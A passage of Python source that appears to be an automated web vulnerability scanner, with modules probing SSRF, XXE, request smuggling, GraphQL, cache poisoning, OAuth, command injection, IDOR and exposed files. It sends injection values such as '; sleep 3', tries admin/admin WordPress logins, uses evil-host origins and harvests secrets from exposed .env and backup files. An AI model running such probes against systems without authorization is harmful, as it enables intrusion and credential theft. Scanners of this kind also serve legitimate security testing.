            if any(ind in r.text for ind in ["ami-id","instance-id","computeMetadata","iam/","root:x:"]):
                job.add_vuln("SSRF", url, param=param, payload=ssrf_url,
                             evidence=f"SSRF to {ssrf_url} — cloud metadata returned!")
                return
            if time.time() - t0 > 3.5 and "169.254" in ssrf_url:
                job.add_vuln("SSRF", url, param=param, payload=ssrf_url,
                             evidence="Blind SSRF — response delayed on cloud metadata URL")
                return


# ── Module E: XXE Injection ───────────────────────────────────────────────────
def mod_xxe(job, url):
    """Test XML-consuming endpoints for External Entity injection."""
    # Look for XML endpoints from discovered URLs
    xml_urls = [u for u in job.urls if any(x in u.lower() for x in
                ["/xml", "/soap", "/api", "/upload", "/import", "/feed", "/rss"])]
    xml_urls.append(url)

    for target in xml_urls[:5]:
        for payload in XXE_PAYLOADS:
            try:
                r = requests.post(target, data=payload,
                                  headers={"Content-Type":"application/xml",
                                           "User-Agent": UAS[0]},
                                  timeout=TIMEOUT, verify=False)
                if r and any(ind in r.text for ind in XXE_INDICATORS):
                    job.add_vuln("XXE Injection", target,
                                 payload=payload[:80],
                                 evidence=f"XXE confirmed — server file content in response",
                                 extracted={"indicator": next(i for i in XXE_INDICATORS if i in r.text)})
                    job.chain("XXE confirmed — can read /etc/passwd and make internal requests")
                    return
            except:
                pass


# ── Module F: HTTP Request Smuggling ─────────────────────────────────────────
def mod_request_smuggling(job, url):
    """Detect CL.TE and TE.CL request smuggling via timing analysis."""
    parsed = urlparse(url)
    host   = parsed.netloc
    port   = 443 if parsed.scheme == "https" else 80

    # CL.TE: send Content-Length that mismatches Transfer-Encoding
    cl_te_request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"0\r\n\r\n"
        f"X"
    ).encode()

    try:
        s = socket.create_connection((parsed.hostname, port), timeout=5)
        if parsed.scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=parsed.hostname)

        t0 = time.time()
        s.sendall(cl_te_request)
        s.settimeout(6)
        try:
            resp = s.recv(1024).decode("utf-8", errors="ignore")
            elapsed = time.time() - t0
            if elapsed > 5.0 or "400" in resp[:15]:
                job.add_vuln("HTTP Request Smuggling", url,
                             payload="CL.TE desync probe",
                             evidence=f"Possible CL.TE smuggling — server delayed {elapsed:.1f}s or returned 400")
                job.chain("HTTP Request Smuggling candidate — manual verification recommended")
        except socket.timeout:
            job.add_vuln("HTTP Request Smuggling", url,
                         payload="CL.TE desync probe",
                         evidence="CL.TE probe caused timeout — server may be vulnerable to request smuggling")
        s.close()
    except Exception:
        pass


# ── Module G: GraphQL Security ────────────────────────────────────────────────
def mod_graphql(job):
    """Test GraphQL endpoints for introspection, DoS, and auth bypass."""
    gql_endpoints = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql",
                     "/query", "/gql"]
    for ep in gql_endpoints:
        target = job.url + ep
        r = job.req(target)
        if not r or r.status_code not in (200, 400, 405):
            continue

        # Test introspection
        try:
            r2 = requests.post(target,
                               json={"query": GRAPHQL_INTRO},
                               headers={"Content-Type":"application/json","User-Agent":UAS[0]},
                               timeout=TIMEOUT, verify=False)
            if r2.status_code == 200 and "__schema" in r2.text:
                types = len(re.findall(r'"name":"[A-Z][a-zA-Z]+"', r2.text))
                job.add_vuln("GraphQL Introspection", target,
                             payload=GRAPHQL_INTRO[:60],
                             evidence=f"Introspection enabled — {types} types exposed. Full schema accessible.",
                             extracted={"types_count": types})
                job.chain(f"GraphQL schema fully exposed — {types} types enumerable for targeted attacks")

            # Test deeply nested query (DoS potential)
            r3 = requests.post(target,
                               json={"query": GRAPHQL_DEEP},
                               headers={"Content-Type":"application/json","User-Agent":UAS[0]},
                               timeout=8, verify=False)
            if r3 and r3.status_code == 200 and r3.elapsed.total_seconds() > 2.0:
                job.add_vuln("GraphQL DoS", target,
                             payload=GRAPHQL_DEEP[:60],
                             evidence=f"Deep nested query took {r3.elapsed.total_seconds():.1f}s — no depth limiting")

            # Batch query abuse
            batch = [{"query": "{__typename}"}] * 50
            r4 = requests.post(target, json=batch,
                               headers={"Content-Type":"application/json","User-Agent":UAS[0]},
                               timeout=TIMEOUT, verify=False)
            if r4 and r4.status_code == 200 and "data" in r4.text:
                job.add_vuln("GraphQL DoS", target,
                             payload="Batch query x50",
                             evidence="Batch queries accepted without rate limiting — DoS risk")
        except:
            pass


# ── Module H: HTTP Parameter Pollution ───────────────────────────────────────
def mod_hpp(job, url):
    """Test duplicate parameters for WAF bypass and logic confusion."""
    parsed = urlparse(url)
    if not parsed.query:
        return
    params = dict(parse_qsl(parsed.query))

    for param, value in params.items():
        # Send same param twice with XSS in second
        test_url = url + f"&{param}=<script>alert(1)</script>"
        r = job.req(test_url)
        if r and "<script>alert(1)</script>" in r.text:
            job.add_vuln("HTTP Parameter Pollution", url,
                         param=param,
                         payload=f"{param}={value}&{param}=<script>alert(1)</script>",
                         evidence="Second duplicate parameter reflected — WAF bypassed via HPP")
            return

        # Test HPP for logic confusion (numeric)
        if value.isdigit():
            test_url2 = url + f"&{param}=0"
            r2 = job.req(test_url2)
            if r2 and r2.status_code == 200:
                if abs(len(r2.text) - (lambda r3: len(r3.text) if r3 else 0)(job.req(url))) > 100:
                    job.add_vuln("HTTP Parameter Pollution", url,
                                 param=param,
                                 payload=f"{param}={value}&{param}=0",
                                 evidence="Duplicate numeric parameter changed response — logic confusion possible")
                    return


# ── Module I: Business Logic Flaws ───────────────────────────────────────────
def mod_business_logic(job, url):
    """Detect business logic flaws: negative values, zero price, int overflow."""
    parsed = urlparse(url)
    if not parsed.query:
        return
    params = dict(parse_qsl(parsed.query))

    for param, value in params.items():
        ptype = FUZZER.detect_type(param, value)

        if ptype in ("integer", "pagination"):
            for bval in FUZZER.get_boundary(ptype):
                tp = params.copy(); tp[param] = bval
                r  = job.req(url, params=tp)
                if not r:
                    continue
                # Negative quantities accepted
                if bval in ("-1", "-2147483648") and r.status_code == 200:
                    body_l = r.text.lower()
                    if any(kw in body_l for kw in ["cart","order","total","price","quantity","amount"]):
                        job.add_vuln("Business Logic Flaw", url, param=param, payload=bval,
                                     evidence=f"Negative value {bval} accepted in business context — price manipulation possible")
                        return
                # Stack trace on boundary
                if r.status_code == 500:
                    job.add_vuln("Stack Trace Leaked", url, param=param, payload=bval,
                                 evidence=f"HTTP 500 on boundary value {bval} — exception not handled")
                if "traceback" in r.text.lower() or "stack trace" in r.text.lower():
                    job.add_vuln("Stack Trace Leaked", url, param=param, payload=bval,
                                 evidence="Framework stack trace leaked in response")
                    return

        # Mass assignment test via POST
        if param.lower() in ("role","admin","is_admin","privilege","level","type","rank"):
            tp = params.copy(); tp[param] = "admin"
            r  = job.req(url, params=tp)
            if r and "admin" in r.text.lower() and r.status_code == 200:
                job.add_vuln("Business Logic Flaw", url, param=param, payload=f"{param}=admin",
                             evidence="Privilege escalation via URL parameter — role set to admin without auth")
                return


# ── Module J: Web Cache Poisoning ─────────────────────────────────────────────
def mod_cache_poison(job, url):
    """Test unkeyed headers for cache poisoning."""
    for hdr, val in CACHE_HEADERS:
        try:
            r = requests.get(url, headers={hdr: val, "User-Agent": UAS[0],
                                           "Cache-Control": "no-cache"},
                             timeout=TIMEOUT, verify=False)
            if not r:
                continue
            # Check if injected value reflected in response
            if val in r.text or val in str(r.headers):
                cache_ctrl = r.headers.get("Cache-Control", "")
                cache_age  = r.headers.get("Age", "")
                age_val    = r.headers.get("X-Cache", "")
                if "public" in cache_ctrl or cache_age or "hit" in age_val.lower():
                    job.add_vuln("Web Cache Poisoning", url,
                                 payload=f"{hdr}: {val}",
                                 evidence=f"Header '{hdr}' reflected + response is cacheable — cache poisoning possible")
                    job.chain(f"Cache poisoning via {hdr} — poisoned response could serve to all users")
                    return
                elif val in r.text:
                    job.log(f"Cache poison candidate: {hdr} reflected but may not be cached", "WARN")
        except:
            pass


# ── Module K: OAuth / Auth Flow Testing ──────────────────────────────────────
def mod_oauth(job):
    """Detect OAuth/authentication flow misconfigurations."""
    oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
                   "/connect/authorize", "/openid/connect", "/.well-known/openid-configuration",
                   "/oauth/token", "/login/oauth/authorize"]
    for path in oauth_paths:
        r = job.req(job.url + path)
        if not r or r.status_code not in (200, 302, 400):
            continue

        job.log(f"OAuth endpoint found: {path}", "WARN")

        # Test missing state parameter (CSRF on OAuth)
        if "redirect_uri" in r.text or "response_type" in r.text:
            test_url = (f"{job.url}{path}?response_type=code&client_id=test"
                        f"&redirect_uri=https://evil-phantom-test.com&scope=openid")
            r2 = job.req(test_url, allow_redirects=False)
            if r2 and r2.status_code in (301, 302):
                loc = r2.headers.get("Location", "")
                if "evil-phantom-test.com" in loc:
                    job.add_vuln("OAuth Misconfiguration", job.url + path,
                                 payload="redirect_uri=https://evil-phantom-test.com",
                                 evidence="redirect_uri not validated — OAuth token theft via open redirect")
                    job.chain("OAuth redirect_uri bypass — authorization codes can be stolen")
                    return
                if "state=" not in test_url and "state" not in loc:
                    job.add_vuln("OAuth Misconfiguration", job.url + path,
                                 evidence="No state parameter required — CSRF on OAuth login flow possible")


# ── Module L: CMS Deep Scanning ───────────────────────────────────────────────
def mod_cms_deep(job):
    """Deep scan detected CMS — WordPress, Joomla, Drupal."""
    tech = job.tech_stack

    if "WordPress" in tech:
        _scan_wordpress(job)
    if "Joomla" in tech:
        _scan_joomla(job)
    if "Drupal" in tech:
        _scan_drupal(job)

    # Auto-detect if tech stack not already known
    if not any(t in tech for t in ["WordPress","Joomla","Drupal"]):
        r = job.req(job.url + "/wp-login.php")
        if r and r.status_code == 200 and "wordpress" in r.text.lower():
            job.tech_stack.append("WordPress"); _scan_wordpress(job)
        r = job.req(job.url + "/administrator/index.php")
        if r and r.status_code == 200 and "joomla" in r.text.lower():
            job.tech_stack.append("Joomla"); _scan_joomla(job)
        r = job.req(job.url + "/CHANGELOG.txt")
        if r and r.status_code == 200 and "drupal" in r.text.lower():
            job.tech_stack.append("Drupal"); _scan_drupal(job)


def _scan_wordpress(job):
    job.log("WordPress detected — deep scanning...", "WARN")

    # User enumeration
    r = job.req(job.url + "/wp-json/wp/v2/users")
    if r and r.status_code == 200:
        try:
            users = json.loads(r.text)
            usernames = [u.get("slug","") or u.get("name","") for u in users[:5]]
            if usernames:
                job.add_vuln("WordPress Vulnerability", job.url + "/wp-json/wp/v2/users",
                             evidence=f"REST API user enumeration — usernames: {', '.join(usernames)}",
                             extracted={"usernames": usernames})
                job.chain(f"WordPress user enumeration — {len(users)} users found: {usernames}")
        except:
            pass

    # Version detection
    r = job.req(job.url + "/readme.html")
    if r and r.status_code == 200:
        vm = re.search(r"Version (\d+\.\d+\.?\d*)", r.text)
        if vm:
            job.add_vuln("WordPress Vulnerability", job.url + "/readme.html",
                         evidence=f"WordPress version exposed in readme.html: {vm.group(1)}")

    # xmlrpc.php (bruteforce amplification)
    r = job.req(job.url + "/xmlrpc.php")
    if r and r.status_code == 200 and "xmlrpc" in r.text.lower():
        job.add_vuln("WordPress Vulnerability", job.url + "/xmlrpc.php",
                     evidence="xmlrpc.php accessible — allows brute-force amplification attacks (1 request = 1000 login attempts)")

    # Default creds on wp-login.php
    r = job.req(job.url + "/wp-login.php", method="POST",
                data={"log":"admin","pwd":"admin","wp-submit":"Log+In",
                      "redirect_to":"/wp-admin/","testcookie":"1"})
    if r and "/wp-admin" in r.url and "wp-admin" in r.text:
        job.add_vuln("Default Credentials", job.url + "/wp-login.php",
                     evidence="WordPress admin/admin login successful!")
        job.chain("WordPress admin login with admin:admin — full site compromise")


def _scan_joomla(job):
    job.log("Joomla detected — deep scanning...", "WARN")
    r = job.req(job.url + "/administrator/manifests/files/joomla.xml")
    if r and r.status_code == 200:
        vm = re.search(r"<version>(.*?)</version>", r.text)
        if vm:
            job.add_vuln("Joomla Vulnerability", job.url + "/administrator/manifests/files/joomla.xml",
                         evidence=f"Joomla version exposed: {vm.group(1)}")
    r = job.req(job.url + "/configuration.php~")
    if r and r.status_code == 200 and "JFactory" in r.text:
        job.add_vuln("Joomla Vulnerability", job.url + "/configuration.php~",
                     evidence="Joomla configuration backup file exposed — database credentials accessible")
        job.chain("Joomla configuration backup exposed — DB credentials likely leaked")


def _scan_drupal(job):
    job.log("Drupal detected — deep scanning...", "WARN")
    r = job.req(job.url + "/CHANGELOG.txt")
    if r and r.status_code == 200:
        vm = re.search(r"Drupal (\d+\.\d+)", r.text)
        if vm:
            ver = vm.group(1)
            job.add_vuln("Drupal Vulnerability", job.url + "/CHANGELOG.txt",
                         evidence=f"Drupal version exposed: {ver} — check for Drupalgeddon CVEs",
                         extracted={"version": ver})
            # Check for Drupalgeddon2 (CVE-2018-7600) — affects < 7.58 and 8.x < 8.3.9
            try:
                major, minor = int(ver.split(".")[0]), int(ver.split(".")[1])
                if (major == 7 and minor < 58) or (major == 8 and minor < 4):
                    job.add_vuln("Drupal Vulnerability", job.url,
                                 evidence=f"Drupalgeddon2 CVE-2018-7600 likely — v{ver} is in vulnerable range",
                                 extracted={"cve": "CVE-2018-7600"})
                    job.chain(f"Drupalgeddon2 (CVE-2018-7600) — Drupal {ver} is in vulnerable range")
            except:
                pass


# ── Module M: Rate Limiting Checker ──────────────────────────────────────────
def mod_rate_limit(job):
    """Test for missing rate limiting on login and API endpoints."""
    test_endpoints = ["/login","/signin","/api/login","/auth/login",
                      "/wp-login.php","/admin/login","/user/login"] +                      [u for u in job.urls if "login" in u.lower() or "auth" in u.lower()][:3]

    for endpoint in test_endpoints[:5]:
        target = job.url + endpoint if endpoint.startswith("/") else endpoint
        r0 = job.req(target)
        if not r0 or r0.status_code not in (200, 405, 302):
            continue

        # Send 15 rapid requests and check for 429/rate-limit response
        limited = False
        for i in range(15):
            try:
                r = requests.get(target, headers={"User-Agent": UAS[i % len(UAS)]},
                                 timeout=3, verify=False)
                if r.status_code == 429 or "too many" in r.text.lower() or "rate limit" in r.text.lower():
                    limited = True
                    job.log(f"Rate limiting active on {endpoint}", "OK")
                    break
            except:
                break

        if not limited:
            job.add_vuln("Rate Limiting Missing", target,
                         evidence=f"15 rapid requests to {endpoint} — no 429 or throttle detected",
                         extracted={"endpoint_type": "login/auth",
                                    "risk": "Brute-force and credential stuffing attacks possible"})
            return


# ── Module N: CSP Deep Analyzer ───────────────────────────────────────────────
def mod_csp(job):
    """Deep Content Security Policy analysis — detect bypasses and weaknesses."""
    r = job.req(job.url)
    if not r:
        return

    csp = r.headers.get("Content-Security-Policy", "")
    if not csp:
        job.add_vuln("CSP Weakness", job.url,
                     evidence="No Content-Security-Policy header — no XSS protection policy")
        job.csp_analysis = {"present": False}
        return

    issues = []
    directives = {}
    for part in csp.split(";"):
        part = part.strip()
        if " " in part:
            key, *vals = part.split()
            directives[key.lower()] = " ".join(vals)

    # Check dangerous directives
    if "unsafe-inline" in csp:
        issues.append("unsafe-inline — inline scripts/styles allowed, defeating XSS protection")
    if "unsafe-eval" in csp:
        issues.append("unsafe-eval — eval() allowed, code injection risk")
    if "'*'" in csp or "* " in csp or csp.strip().endswith("*"):
        issues.append("Wildcard (*) source — any origin can load resources")
    if "data:" in csp and "script-src" in csp:
        issues.append("data: URI in script-src — XSS bypass via data: URI possible")
    if "http:" in csp:
        issues.append("http: protocol in CSP — content downgrade possible")
    if "default-src" not in directives and "script-src" not in directives:
        issues.append("No default-src or script-src — scripts unrestricted")
    if "report-uri" not in csp and "report-to" not in csp:
        issues.append("No report-uri — CSP violations not monitored")

    job.csp_analysis = {"present": True, "directives": directives, "issues": issues}

    if issues:
        for issue in issues:
            job.add_vuln("CSP Weakness", job.url,
                         evidence=f"CSP issue: {issue}",
                         extracted={"directive_count": len(directives)})
        job.log(f"CSP analysis: {len(issues)} weaknesses found", "WARN")
    else:
        job.log("CSP analysis: Policy appears well-configured", "OK")


# ── Module O: CORS ────────────────────────────────────────────────────────────
def mod_cors(job):
    for origin in ["https://evil-phantom-test.com", "null",
                   f"https://{job.host}.evil.com", f"https://evil.{job.host}"]:
        r = job.req(job.url, headers={"Origin": origin, "User-Agent": UAS[0]})
        if not r:
            continue
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "false")
        if acao == origin:
            sev_note = "CRITICAL" if acac.lower() == "true" else "HIGH"
            job.add_vuln("CORS Misconfiguration", job.url,
                         evidence=f"Origin '{origin}' reflected. ACAC={acac} [{sev_note}]",
                         extracted={"reflected_origin": origin, "credentials_allowed": acac})
        elif acao == "*" and acac.lower() == "true":
            job.add_vuln("CORS Misconfiguration", job.url,
                         evidence="Wildcard ACAO with credentials=true — forbidden combination")


# ── Module P: Security Headers ────────────────────────────────────────────────
def mod_headers(job):
    r = job.req(job.url)
    if not r:
        return
    hlc = {k.lower(): v for k, v in r.headers.items()}

    for hdr, info in SECURITY_HEADERS.items():
        if hdr.lower() not in hlc:
            job.add_vuln(f"Missing Header ({info['risk']})", job.url,
                         evidence=f"No {hdr} — {info['desc']}",
                         extracted={"recommended": f"{hdr}: {info['rec']}"})
        else:
            val = hlc[hdr.lower()]
            if hdr == "Content-Security-Policy":
                if "unsafe-inline" in val:
                    job.add_vuln("Missing Header (MEDIUM)", job.url,
                                 evidence=f"Weak CSP: unsafe-inline present in: {val[:60]}")

    if "x-frame-options" not in hlc and "content-security-policy" not in hlc:
        job.add_vuln("Clickjacking", job.url,
                     evidence="No X-Frame-Options or CSP frame-ancestors — site embeddable in iframes")

    for lh in ["Server","X-Powered-By","X-AspNet-Version","X-Generator","X-Runtime","X-Debug-Token"]:
        if lh.lower() in hlc:
            job.add_vuln("Info Disclosure", job.url,
                         evidence=f"{lh}: {hlc[lh.lower()]} — technology version exposed")


# ── Module Q: Cookie & Session Security ──────────────────────────────────────
def mod_cookies(job):
    r = job.req(job.url)
    if not r:
        return

    for ck in r.cookies:
        flags = []
        sc = r.headers.get("Set-Cookie","").lower()
        if not ck.secure:          flags.append("No Secure flag")
        if "httponly" not in sc:    flags.append("No HttpOnly flag")
        if "samesite" not in sc:    flags.append("No SameSite flag")
        if flags:
            job.add_vuln("Insecure Cookie", job.url, param=ck.name,
                         evidence=f"Cookie '{ck.name}': {', '.join(flags)}")

    # JWT detection and analysis
    jwt_re = r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
    for m in re.finditer(jwt_re, r.text + str(r.headers)):
        tok = m.group(0)
        try:
            hdr_raw = tok.split(".")[0]
            pld_raw = tok.split(".")[1]
            hdr_dec = json.loads(base64.urlsafe_b64decode(hdr_raw + "=="))
            pld_dec = json.loads(base64.urlsafe_b64decode(pld_raw + "=="))
            alg     = hdr_dec.get("alg", "?")
            claims  = list(pld_dec.keys())
            sens    = [k for k in pld_dec if k in ("password","pwd","secret","ssn","role","admin","is_admin")]
            evidence = f"JWT alg={alg} claims={claims[:6]}"
            if alg.lower() == "none":
                evidence += " — alg:none is CRITICAL (signature bypassed!)"
            if sens:
                evidence += f" — SENSITIVE claims: {sens}"
            job.add_vuln("JWT Issue", job.url,
                         evidence=evidence,
                         extracted={"algorithm": alg, "sensitive_claims": sens, "all_claims": claims[:10]})
        except:
            pass

    # CSRF token check
    for form in job.forms:
        if form["method"] == "POST":
            has_csrf = any(any(kw in n.lower() for kw in ["csrf","token","_token","xsrf","nonce"])
                          for n in form["inputs"])
            if not has_csrf:
                job.add_vuln("CSRF Missing Token", form["action"],
                             evidence="POST form without CSRF protection token")


# ── Module R: Command Injection ───────────────────────────────────────────────
def mod_cmdi(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    for param in params:
        t0 = time.time()
        tp = params.copy(); tp[param] = "; sleep 3"
        r  = job.req(url, params=tp)
        if r and time.time() - t0 > 3.0:
            job.add_vuln("Command Injection", url, param=param, payload="; sleep 3",
                         evidence="Response delayed >3s — time-based command injection confirmed")
            return
        for payload in CMD_PAYLOADS[:5]:
            tp = params.copy(); tp[param] = payload
            r  = job.req(url, params=tp)
            if r and any(ind in r.text for ind in CMD_INDICATORS):
                job.add_vuln("Command Injection", url, param=param, payload=payload,
                             evidence="OS command output detected in response")
                return


# ── Module S: IDOR ────────────────────────────────────────────────────────────
def mod_idor(job, url):
    params    = dict(parse_qsl(urlparse(url).query))
    num_params = {k: v for k, v in params.items() if v.isdigit() and int(v) > 0}
    if not num_params:
        return
    base_r = job.req(url)
    if not base_r:
        return

    for param, val in num_params.items():
        orig = int(val)
        for test_id in [orig+1, orig-1, 1, orig+100, 9999]:
            if test_id <= 0:
                continue
            tp = params.copy(); tp[param] = str(test_id)
            r  = job.req(url, params=tp)
            if r and r.status_code == 200 and abs(len(r.text) - len(base_r.text)) > 100:
                job.add_vuln("IDOR", url, param=param,
                             payload=f"{param}={test_id}",
                             evidence=f"ID {test_id} returned different data than ID {orig} — unauthorized access possible")
                return

    # HTTP verb tampering
    for method in ["PUT","DELETE","PATCH"]:
        r = job.req(url, method=method)
        if r and r.status_code not in (404, 405, 501, 403):
            job.add_vuln("IDOR", url,
                         payload=f"Method: {method}",
                         evidence=f"HTTP verb tampering — {method} {url} returned {r.status_code}")
            return


# ── Module T: Open Redirect ───────────────────────────────────────────────────
def mod_redirect(job, url):
    params = dict(parse_qsl(urlparse(url).query))
    for param, val in params.items():
        if param.lower() in REDIRECT_PARAMS:
            for payload in REDIRECT_PAYLOADS:
                tp = params.copy(); tp[param] = payload
                r  = job.req(url, params=tp, allow_redirects=False)
                if r and r.status_code in (301, 302, 303, 307, 308):
                    loc = r.headers.get("Location","")
                    if "evil-phantom-test.com" in loc:
                        job.add_vuln("Open Redirect", url, param=param, payload=payload,
                                     evidence=f"Redirects to external domain: {loc}")
                        return


# ── Module U: Sensitive Files ──────────────────────────────────────────────────
def mod_files(job):
    base = job.url
    def probe(path):
        r = job.req(base + path, allow_redirects=False)
        if r and r.status_code in (200, 401, 403):
            return path, r.status_code, r.text[:3000]
        return None

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futs = {ex.submit(probe, p): p for p in SENSITIVE_FILES + ADMIN_PATHS}
        for fut in as_completed(futs):
            res = fut.result()
            if not res:
                continue
            path, status, content = res
            if status == 200:
                ext = {}
                if ".env" in path:
                    keys = re.findall(r"([A-Z_]+=\S+)", content)
                    if keys:
                        ext["env_keys"] = keys[:5]
                        job.chain(f".env exposed — {len(keys)} keys found including: {keys[0][:30]}")
                elif ".git/config" in path:
                    m = re.search(r"url\s*=\s*(.+)", content)
                    if m:
                        ext["repo_url"] = m.group(1).strip()
                        if "@" in m.group(1):
                            job.chain(f"Git remote URL contains embedded credentials: {m.group(1)[:60]}")
                elif "phpinfo" in path:
                    vm = re.search(r"PHP Version ([\d.]+)", content)
                    if vm:
                        ext["php_version"] = vm.group(1)
                elif "swagger" in path or "api-docs" in path:
                    eps = re.findall(r'"/([\w/{}\-]+)"', content)
                    if eps:
                        ext["api_endpoints"] = eps[:15]
                        job.chain(f"Swagger/OpenAPI docs exposed — {len(eps)} API endpoints enumerated")
                elif "backup" in path and ".sql" in path:
                    tables = re.findall(r"CREATE TABLE `?(\w+)`?", content)
                    if tables:
                        ext["sql_tables"] = tables[:10]
                        job.chain(f"SQL backup exposed — {len(tables)} tables: {', '.join(tables[:3])}")

                vtype = "Admin Panel Found" if path in ADMIN_PATHS else "Sensitive File Exposed"
                job.add_vuln(vtype, base + path,
                             evidence=f"HTTP 200 — {len(content)}B of sensitive content exposed",
                             extracted=ext)
                # Scan content for secrets
                for kt, pattern in JS_SECRETS.items():
                    m = re.search(pattern, content)
                    if m:
                        job.add_vuln("API Key Exposed", base + path,
                                     evidence=f"{kt}: {m.group(0)[:40]}...")
                        break


# ── Module V: Secret Scanner on all responses ─────────────────────────────────
def mod_secrets_scan(job, url):
    r = job.req(url)
    if not r:
        return
    for kt, pattern in JS_SECRETS.items():
        m = re.search(pattern, r.text)
        if m:
            val = m.group(0)[:100]
            if not any(val == s.get("value","")[:100] for s in job.secrets):
                sev = SECRET_SEV.get(kt, "HIGH")
                with job._lock:
                    job.secrets.append({"type": kt, "value": val, "url": url, "severity": sev})
                job.add_vuln("API Key Exposed", url,
                             evidence=f"{kt}: {val[:40]}...")


# ── Module W: Advanced Fingerprinting ─────────────────────────────────────────
def mod_fingerprint(job):
    """Advanced technology fingerprinting via error pages, timing, and headers."""
    r = job.req(job.url)
    if not r:
        return

    # Error page fingerprinting
    r_err = job.req(job.url + "/phantom_nonexistent_8x7z_page")
    if r_err:
        body = r_err.text.lower()
        fp_map = {
            "Apache": ["apache/", "apache http server"],
            "Nginx":  ["nginx/", "nginx error"],
            "IIS":    ["ii
